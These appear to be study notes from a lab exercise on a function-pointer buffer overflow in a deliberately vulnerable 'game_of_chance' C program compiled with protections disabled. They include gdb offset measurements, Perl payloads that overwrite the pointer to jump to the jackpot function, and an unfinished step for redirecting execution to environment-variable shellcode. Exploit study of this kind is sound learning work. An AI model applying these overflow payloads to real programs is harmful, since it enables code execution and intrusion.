########## function pointer overflow ##########

struct user {
  int uid;
  int credits;
  int highscore;
  char name[100];           // try to overflow current_game
  int (*current_game) ();
};

// global variables
struct user player;

##############################

gcc -g -m32 -fno-stack-protector -z execstack -fno-pie -no-pie -z norelro ../chapter02/game_of_chance.c -o game_of_chance.out

* `game_of_chance` uses a function pointer to remember the last game played
* this pointer is stored in the user structure, which is declared as a global variable
* all the memory for the user structure is allocated in the bss segment

gdb -q game_of_chance.out 
(gdb) break main
(gdb) run
(gdb) p player
$1 = {uid = 0, credits = 0, highscore = 0, name = '\000' <repeats 99 times>, current_game = 0x0}
(gdb) x/x &player.name
0x804b68c <player+12>:	0x00000000
(gdb) x/x &player.current_game
0x804b6f0 <player+112>:	0x00000000
(gdb) p 0x804b6f0 - 0x804b68c
$2 = 100

perl -e 'print "A"x100 . "BBBB" . "\n"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

##############################

./game_of_chance.out 
-=-={ New Player Registration }=-=-
Enter your name: test

Welcome to the Game of Chance test.
You have been given 100 credits.
-=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits
7 - Quit
[Name: test]
[You have 100 credits] ->  1

[DEBUG] current_game pointer @ 0x08048fb3

####### Pick a Number ######
This game costs 10 credits to play. Simply pick a number
between 1 and 20, and if you pick the winning number, you
will win the jackpot of 100 credits!

10 credits have been deducted from your account.
Pick a number between 1 and 20: 8
The winning number is 13
Sorry, you didn't win.

You now have 90 credits
Would you like to play again? (y/n)  n
-=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits
7 - Quit
[Name: test]
[You have 90 credits] ->  5

Change user name
Enter your new name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Your name has been changed.

-=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits
7 - Quit
[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB]
[You have 90 credits] ->  1

[DEBUG] current_game pointer @ 0x42424242
Segmentation fault (core dumped)

##############################

nm game_of_chance.out
...
08048d24 T jackpot
080487af T main
...

rm /var/chance.data
perl -e 'print "test\n1\n8\nn\n5\n" . "A"x100 . "BBBB" . "\n1"' | ./game_of_chance.out

perl -e 'print "test\n1\n8\nn\n5\n" . "A"x100 . "\xaf\xbe\xad\xde" . "\n1"' | ./game_of_chance.out
08|04|8d|24
perl -e 'print "test\n1\n8\nn\n5\n" . "A"x100 . "\x24\x8d\x04\x08" . "\n1"' | ./game_of_chance.out
perl -e 'print "test\n1\n8\nn\n5\n" . "A"x100 . "\x24\x8d\x04\x08" . "\n1\nn\n" . "7\n"' | ./game_of_chance.out
perl -e 'print "test\n1\n8\nn\n5\n" . "A"x100 . "\x24\x8d\x04\x08" . "\n1\n" . "y\n"x10 . "n\n5\ntest\n7\n"' | ./game_of_chance.out

*+*+*+*+*+* JACKPOT *+*+*+*+*+*
You have won the jackpot of 100 credits!

##############################

./getenv_example.out HOME
HOME is at 0xffd9bf68
./getenvaddr.out HOME ./game_of_chance.out 
HOME will be at 0xfffadf68

# TODO shellcode
export SHELLCODE=$(cat ./shellcode.bin)
./getenvaddr SHELLCODE ./game_of_chance.out
perl -e 'print "test\n1\n8\nn\n5\n" . "A"x100 . "\x??\x??\x??\x??\n" . "1\n"' > exploit_buffer
cat exploit_buffer - | ./game_of_chance.out
